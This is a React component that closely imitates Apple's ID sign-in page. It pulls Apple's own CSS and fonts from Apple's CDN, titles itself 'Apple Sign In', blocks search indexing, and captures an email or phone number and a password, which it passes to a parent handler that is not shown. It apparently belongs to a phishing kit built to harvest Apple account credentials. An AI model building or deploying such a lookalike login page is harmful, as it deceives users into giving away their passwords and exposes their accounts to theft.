import React, { useState } from 'react';
import { useEffect } from 'react';
import './Logbar.css';
import './Check.css';

 function Logbar({ username, password, setUsername, setPassword, onNext }) {
const [showPasswordField, setShowPasswordField] = useState(false);

  // Handler for the "Continue" button click
  const handleSignInClick = (e) => {
    e.preventDefault();
    if (username.trim() !== '') {
      // Apply CSS changes to the email input box
      const emailInputBox = document.getElementById('account_name_text_field');
      const button = document.getElementById('sign-in');
      emailInputBox.style.borderBottomLeftRadius = '0px';
      emailInputBox.style.borderBottomRightRadius = '0px';
      emailInputBox.style.borderBottomWidth = '1px';
      

      // Lower the bottom of the email input by adjusting the margin
      button.style.top = '115px'; // Example: Lowering by 20px

      // Show the password field if email is populated
      setShowPasswordField(true);
      // document.getElementById(`password_text_field`).focus()
      


      if (username.trim() !== '' && password.trim() !== '') {
        // Only call onNext if both username and password are valid
        if (typeof onNext === 'function') {
          onNext(); // Trigger the onNext function passed as a prop
        } else {
          console.error('onNext is not a function');
        }
      }
      
      
    }

  };
  useEffect(() => {
    if (showPasswordField) {
      // Focus the password input field after showPasswordField state is updated
      document.getElementById('password_text_field').focus();
    }
  }, [showPasswordField]); // This hook runs whenever showPasswordField changes

  return (
    <div dir="ltr" data-rtl="false" lang="en" className="prefpane na-presentation form-mouseuser">
      <head>
        <title>Apple Sign In</title>
        <meta name="robots" content="noindex" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <link rel="stylesheet" href="https://www.apple.com/wss/fonts?families=SF+Pro,v3|SF+Pro+Icons,v3" />
        <link rel="stylesheet" href="https://appleid.cdn-apple.com/appleauth/static/module-assets/home-3885da1b99bf1a276ccf.css" />
        <link rel="stylesheet" href="https://appleid.cdn-apple.com/appleauth/static/cssj/431834531/widget/auth/app-sk7.css" />
        <link rel="stylesheet" href="/src/components/Logbar.css" />
      </head>

      <body className="tk-body theme-dark">
        <main className="si-body si-container container-fluid" id="content" role="main" data-theme="lite">
          <section className="widget-container fade-in restrict-min-content restrict-max-wh" data-mode="embed" data-isiebutnotedge="false">
            <div id="step" className="si-step">
              <div id="stepEl" className="">
                <div className="signin fade-in" id="signin">
                  <form id="sign_in_form" className="signin-form swp eyebrow fed-auth hide-password">
                    <div className="form-cell-wrapper form-textbox">
                      <input
                        type="text"
                        id="account_name_text_field"
                        aria-labelledby="apple_id_field_label"
                        autoCorrect="off"
                        autoCapitalize="off"
                        required
                        spellCheck="false"
                        className="force-ltr form-textbox-input"
                        autoComplete="off"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                      />
                      <label id="apple_id_field_label" className="form-textbox-label form-label-flyout">
                        Email or Phone Number
                      </label>
                    </div>

                    {/* Password input box */}
                    {showPasswordField && (
                      <div className="password visible" aria-hidden="false">
                        <div id="enter_box" className="form-cell-wrapper form-textbox">
                          <input
                            type="password"
                            id="password_text_field"
                            aria-labelledby="password_field_label"
                            required
                            className="form-textbox-input"
                            autoComplete="off"
                            aria-invalid="false"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                          />
                          <label id="password_field_label" className="form-textbox-label form-label-flyout">
                            Password
                          </label>
                        </div>
                      </div>
                    )}

<div className="si-remember-password">
      <label className="form-checkbox">
        <input 
          type="checkbox" 
          id="remember-me-checkbox"  // Unique ID
          className="form-checkbox-input" 
        />
        <span 
          className="form-checkbox-indicator" 
          aria-hidden="true"
        ></span>
        Keep me signed in
      </label>
    </div>

                    <button
                      id="sign-in"
                      tabIndex="0"
                      className="si-button btn fed-ui fed-ui-animation-show remember-me"
                      aria-label="Continue"
                      onClick={handleSignInClick}
                    >
                      <i className="shared-icon icon_sign_in"></i>
                      <span className="text feat-split">Continue</span>
                    </button>

                    <a
                      id="iforgot-link"
                      className="si-link ax-outline lite-theme-override"
                      href="https://iforgot.apple.com/password/verify/appleid"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      Forgot <span className="no-wrap">password?</span>
                      <span className="sr-only">Opens in a new window.</span>
                    </a>
                  </form>
                </div>
              </div>
            </div>
          </section>
        </main>
      </body>
    </div>
  );
}
export default Logbar;